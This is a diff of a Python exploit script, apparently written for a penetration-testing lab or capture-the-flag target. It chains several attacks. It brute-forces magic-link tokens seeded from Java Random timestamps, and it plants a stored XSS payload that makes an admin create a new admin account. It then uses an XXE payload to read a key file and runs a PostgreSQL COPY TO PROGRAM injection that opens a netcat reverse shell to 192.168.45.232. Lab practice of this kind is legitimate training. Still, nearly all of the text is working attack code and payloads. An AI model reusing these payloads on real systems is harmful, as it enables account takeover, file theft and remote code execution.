@@ -10,8 +10,9 @@ import time
 from javarandom import Random   # 来自 MostAwesomeDude/java-random 仓库
 import requests
 import urllib.parse
-import random
 from bs4 import BeautifulSoup
+import sys
+import re
 
 # 源代码中的Random类实现方法，由于Random不安全，在同一个时间Random 实例在同一毫秒内被创建时，
 # 默认种子就是当前时间戳,同一个种子生成得随机数是一样的，那么就能爆破出token, 只要我们知道了token生成过程
@@ -41,8 +42,8 @@ def create_token_using_java_random_pkg(seed:str, user_id: int):
 
     return base64.urlsafe_b64encode(encbytes).decode('ascii').rstrip('=')
 
-# 暴力列出来2秒内所有的seed可以得到的token
-def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 1_000):
+# 暴力列出来2秒内所有的seed可以得到的token,建议用2000ms范围，1000ms总是失败
+def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 2_000):
     """把 center_ms ± radius_ms 内所有 token 全算出来"""
     if center_ms is None:
         center_ms = int(time.time() * 1000)
@@ -83,15 +84,15 @@ def consume_magic_link(session: requests.Session, base_url: str, token: str):
 
 # 让管理员xss指定创建管理员用户，后台有过滤，但是仅对开头结尾做了tag过滤
 # 有跨域限制，只能在当前域内操作,并且单双引号会被过滤，用String绕过和URLSearchParams，后端储存的t不是字符串是True输入的isAdmin属性要注意
-# 很奇怪name:String.fromCharCode(98)会被拦截, 发现用数字创建的用户不能使用。。
+# 很奇怪name:String.fromCharCode(98)会被拦截, 发现用数字创建的用户不能使用。最终尝试，发现``没有被拦截
 # 这个可以
-# a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
+# a<script>fetch(`/admin/users/create`,{method:`POST`,body:new URLSearchParams({name:`Frank`,email:1,isAdmin:`True`})})</script>em>
 def generate_xss_payload(session: requests.Session, base_url: str, new_admin:str):
     """
     POST /question 使用cookie的moderator权限用户发送帖子
     """
     payload = r"""
-        a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:%s,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
+        a<script>fetch(`/admin/users/create`,{method:`POST`,body:new URLSearchParams({name:`%s`,email:1,isAdmin:`True`})})</script>em>
         """.strip() % new_admin
     url = urllib.parse.urljoin(base_url, XSS_PATH)
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
@@ -109,7 +110,7 @@ def find_users(session: requests.Session, base_url: str, username: str):
         user = soup.find("h2")
         if user and user.text == username:
             print(f"找到用户 {username}")
-        return user_number
+            return user_number
     print("本次循环未找到创建admin用户")
     return None
 
@@ -126,43 +127,78 @@ def brute_for_user_access(base_url:str, username:str, uid:str, s:requests.Sessio
         cookie = consume_magic_link(s, base_url, tok)
         if cookie:
             print("成功爆破出token，捕获cookie:", cookie)
-            break
+            return True
     if not cookie:
         print("没有成功捕获token，请排除错误")
-        s.close()
+        sys.exit(1)
 
 if __name__ == "__main__":
     base_url = "http://192.168.135.234:8888/"
     #有moderator权限的,需要手动去网页中的/profile/去翻，确认好可用用户
     username = "Carl"
     uid = 5 
+    admin_username = "Fred" # 创建新用户名
+    command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.232 4444 >/tmp/f"
+    # PostgreSQL COPY FROM PROGRAM注入payload
+    inj_payload = f"COPY (SELECT '') TO PROGRAM '{command}'; -- "
 
     with requests.Session() as s:
         # 首先触发后端生成 token,如果成功会更新session,获取编辑权限用户
         brute_for_user_access(base_url, username, uid, s)
         # 用编辑权限用户发XSS payload
-        admin_username = f"{random.randint(100, 1000)}" # 数字当用户名，邮箱必填没有过滤随意的值就可以
         status_code = generate_xss_payload(s, base_url, admin_username)
         if status_code == 200:
-            print(f"XSS已发送到question路径，等待admin点击创建用户{username}，尝试获取admin是否创建成功")
-            # 暂停 10 秒
-            print("请等待10s，需要后台bot进行点击")
-            time.sleep(10)
-            print("10 秒后尝试寻找用户是否创建")
-            user_num = find_users(s, base_url, admin_username)
-            if user_num:
-                print(f"成功找到创建的用户，id为{user_num},进行创建admin用户token爆破")
-                brute_for_user_access(base_url, admin_username, user_num, s)
-                flag = s.get(urllib.parse.urljoin(base_url, "/admin/flag"), allow_redirects=False).text
-                print(f"获取第一个flag为{flag}")
-                #@TODO 通过外部实体注入得到key
+            print(f"XSS已发送到question路径，等待admin点击创建用户{admin_username}，尝试获取admin是否创建成功")
+            print("开始轮询查找用户是否被创建（最长等待5分钟，每10秒检查一次）")
+            user_num = None
+            for i in range(30):  # 5分钟/10秒=30次
+                user_num = find_users(s, base_url, admin_username)
+                if user_num:
+                    print(f"成功找到创建的用户，id为{admin_username},进行创建admin用户token爆破")
+                    brute_for_user_access(base_url, admin_username, user_num, s)
+                    flag = s.get(urllib.parse.urljoin(base_url, "/admin/flag"), allow_redirects=False).text
+                    print(f"获取第一个flag为{flag}")
+                    # 通过外部实体注入(XXE)得到/home/student/adminkey.txt
+                    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
+                        <!DOCTYPE foo [
+                        <!ELEMENT foo ANY >
+                        <!ENTITY xxe SYSTEM "file:///home/student/adminkey.txt" >
+                        ]>
+                        <database>
+                        <categories></categories>
+                        <users></users>
+                        <questions></questions>
+                        <answers>
+                        <answer><description>&xxe;</description><created>2025-09-26</created><ownerId>1</ownerId><questionId>1</questionId></answer>
+                        </answers>
+                        </database>
+                        '''
+                    preview_url = urllib.parse.urljoin(base_url, "/admin/import")
+                    data = {"xmldata": xxe_payload, "preview": "true"}
+                    print("尝试通过XXE注入获取adminkey.txt内容...")
+                    resp = s.post(preview_url, data=data)
 
-                #@TODO 通过Key去admin query，sql注入命令，执行command，反弹shell：'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.171 4444 >/tmp/f'
-
-                s.close()
-            else:
-                print(f"管理员可能未点击XSS payload")
-                s.close()
+                    key_match = re.search(r"([0-9a-fA-F\-]{36})", resp.text)
+                    if key_match:
+                        admin_key = key_match.group(1)
+                        print(f"成功通过XXE获取admin key: {admin_key}")
+                        # 利用admin key访问/admin/query，进行PostgreSQL SQL注入命令执行反弹shell
+                        query_url = urllib.parse.urljoin(base_url, "/admin/query")
+                        data = {"adminKey": admin_key, "query": inj_payload}
+                        print(f"尝试利用admin key进行SQL注入命令执行，payload: {inj_payload}")
+                        resp2 = s.post(query_url, data=data)
+                        print("/admin/query 响应：")
+                        print(resp2.text)
+                        sys.exit(1)
+                    else:
+                        print("未能通过XXE获取admin key，响应如下：")
+                        print(resp.text)
+                    sys.exit(1)
+                else:
+                    print(f"第{i+1}次未找到用户，等待10秒后重试...")
+                    time.sleep(10)
+            print(f"5分钟内未检测到管理员点击XSS payload，用户未被创建")
+            sys.exit(1)
         else:
             print("XSS Payload发送失败")
-            s.close()
+            sys.exit(1)
